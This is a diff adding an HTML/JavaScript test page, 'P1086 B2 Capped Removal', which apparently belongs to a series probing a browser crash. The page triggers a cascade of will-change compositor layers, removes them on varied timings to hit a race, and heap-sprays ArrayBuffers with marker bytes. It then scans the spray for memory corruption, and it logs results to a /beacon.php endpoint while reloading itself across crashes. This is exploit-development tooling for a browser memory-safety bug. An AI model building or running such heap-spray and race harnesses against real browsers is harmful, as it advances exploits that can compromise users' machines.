@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1086 - B2 Capped Removal</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:60vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h2 style="color:#00ff88;font-size:14px">P1086 B2 Capped Removal</h2>
+<div id="log"></div>
+<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px;width:800px;height:600px;overflow:hidden"></div>
+
+<script>
+'use strict';
+var L=document.getElementById('log'),sandbox=document.getElementById('sandbox');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m=String(d||'');log('info','[B] P1086-'+t+' | '+m);
+try{var u='/beacon.php?tag=P1086-'+encodeURIComponent(t);if(m)u+='&data='+encodeURIComponent(m.slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+function h8(v){return('0'+v.toString(16)).slice(-2)}
+
+/* ══════════════════════════════════════════════════════════
+   P1086: isolate P1085's mode-(b) crash (capped cascade of 20
+   will-change layers + RAF removal → death in ~1s).
+
+   All tests cap the cascade at 20. Vary removal timing + spray:
+     C0: RAF removal (T1 repeat — expect DIED)
+     C1: NO removal (20 layers persist)
+     C2: SYNC removal (remove in the observer itself)
+     C3: RAF removal + pre-spray 300x512
+     C4: RAF removal + in-RAF spray (10x512 after each removal)
+     C5: setTimeout(0) removal
+   If C1 survives => removal is the trigger. If C2 survives =>
+   the RAF timing (race) is essential. If C3/C4 survive or scan
+   corrupt => spray wins the window.
+   Heartbeat (1s) + created-count to localStorage survive crashes.
+   ══════════════════════════════════════════════════════════ */
+
+var CAP=20;
+var TESTS=[
+  {name:'C0-raf',          remove:'raf',    spray:'none'},
+  {name:'C1-none',         remove:'none',   spray:'none'},
+  {name:'C2-sync',         remove:'sync',   spray:'none'},
+  {name:'C3-raf-pre',      remove:'raf',    spray:'pre'},
+  {name:'C4-raf-inraf',    remove:'raf',    spray:'inraf'},
+  {name:'C5-timeout',      remove:'timeout',spray:'none'}
+];
+var sec=0,res={};
+try{sec=parseInt(localStorage.getItem('p1086_sec')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1086_res');if(r)res=JSON.parse(r);}catch(e){}
+
+if(sec>0&&sec<=TESTS.length){
+  var pn=TESTS[sec-1].name;
+  var aliveSec=0,created=0;
+  try{aliveSec=parseInt(localStorage.getItem('p1086_hb')||'0');}catch(e){}
+  try{created=parseInt(localStorage.getItem('p1086_created')||'0');}catch(e){}
+  if(!res[pn]){
+    res[pn]='DIED@'+aliveSec+'s,created='+created;
+    B('DIED','test='+pn+'|aliveSec='+aliveSec+'|created='+created);
+  }
+  try{localStorage.setItem('p1086_hb','0');localStorage.setItem('p1086_created','0');}catch(e){}
+}
+function save(){try{localStorage.setItem('p1086_sec',''+sec);
+  localStorage.setItem('p1086_res',JSON.stringify(res));}catch(e){}}
+save();
+
+B('BOOT','sec='+sec+'|prev='+JSON.stringify(res).slice(0,400));
+log('ok','=== P1086 capped removal (sec='+sec+') ===');
+
+function runOne(t){
+  return new Promise(function(resolve){
+    var spray=[],views=[];
+    if(t.spray==='pre'){
+      for(var i=0;i<300;i++){
+        var ab=new ArrayBuffer(512),v=new Uint8Array(ab);
+        v[0]=i&0xFF;v[1]=(i>>8)&0xFF;
+        for(var j=2;j<512;j++)v[j]=0x41;
+        spray.push(ab);views.push(v);
+      }
+    }
+
+    sandbox.innerHTML='';
+    var container=document.createElement('div');
+    container.style.cssText='position:relative;width:100px;height:100px';
+    sandbox.appendChild(container);
+    void sandbox.offsetHeight;
+
+    var created=0,elapsed=0,done=false;
+    var obs=new MutationObserver(function(){
+      if(created>=CAP)return;
+      var el=document.createElement('div');
+      el.style.cssText='position:absolute;width:10px;height:10px;transform:translateZ(0);will-change:transform';
+      container.appendChild(el);
+      created++;
+      try{localStorage.setItem('p1086_created',''+created);}catch(e){}
+
+      if(t.remove==='raf'){
+        requestAnimationFrame(function(){
+          if(el.parentNode)el.parentNode.removeChild(el);
+          if(t.spray==='inraf'){
+            for(var k=0;k<10;k++){
+              var ab2=new ArrayBuffer(512),v2=new Uint8Array(ab2);
+              for(var j2=0;j2<512;j2++)v2[j2]=0xDD;
+              spray.push(ab2);views.push(v2);
+            }
+          }
+        });
+      } else if(t.remove==='sync'){
+        try{container.removeChild(el);}catch(e){}
+      } else if(t.remove==='timeout'){
+        setTimeout(function(){if(el.parentNode)el.parentNode.removeChild(el);},0);
+      }
+      /* 'none': leave it */
+    });
+    obs.observe(container,{childList:true});
+
+    var hb=setInterval(function(){
+      if(done)return;
+      elapsed++;
+      try{localStorage.setItem('p1086_hb',''+elapsed);}catch(e){}
+      if(elapsed>=20){
+        done=true;clearInterval(hb);obs.disconnect();
+        /* survived 20s — scan spray */
+        var corrupt=0,firstHex='';
+        for(var i=0;i<views.length;i++){
+          var v=views[i];if(!v)continue;
+          var exp=(v.length&&i>=300)?0xDD:0x41;
+          for(var j=2;j<v.length;j++){
+            if(v[j]!==0x41&&v[j]!==0xDD){corrupt++;
+              if(!firstHex){for(var k=0;k<64;k++)firstHex+=h8(v[k]);}
+              break;}
+          }
+        }
+        if(corrupt)B('SCAN','test='+t.name+'|corrupt:'+corrupt+'|hex='+firstHex.substring(0,48));
+        resolve('SURVIVED20s,created='+created+(corrupt?(',corrupt:'+corrupt):''));
+      }
+    },1000);
+
+    /* one trigger mutation starts the cascade */
+    var d=document.createElement('div');
+    d.textContent='go';
+    container.appendChild(d);
+
+    B('RUN-START','test='+t.name+'|spray:'+spray.length);
+  });
+}
+
+async function run(){
+  if(sec<TESTS.length){
+    var t=TESTS[sec];
+    try{localStorage.setItem('p1086_sec',''+(sec+1));
+        localStorage.setItem('p1086_hb','0');
+        localStorage.setItem('p1086_created','0');}catch(e){}
+    var outcome=await runOne(t);
+    res[t.name]=outcome;sec++;save();
+    B('RUN-DONE','test='+t.name+'|outcome:'+outcome);
+    setTimeout(function(){location.reload(true);},400);
+    return;
+  }
+  var summary=TESTS.map(function(t){return t.name+'='+(res[t.name]||'?');}).join(' | ');
+  B('DONE',summary);
+  log('ok','=== P1086 COMPLETE: '+summary+' ===');
+  try{localStorage.setItem('p1086_sec','0');localStorage.removeItem('p1086_res');
+  localStorage.removeItem('p1086_hb');localStorage.removeItem('p1086_created');}catch(e){}
+}
+
+run();
+
+/* auto-reload check */
+(function(){
+  var cur='P1086-b2-capped-removal';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body>
+</html>
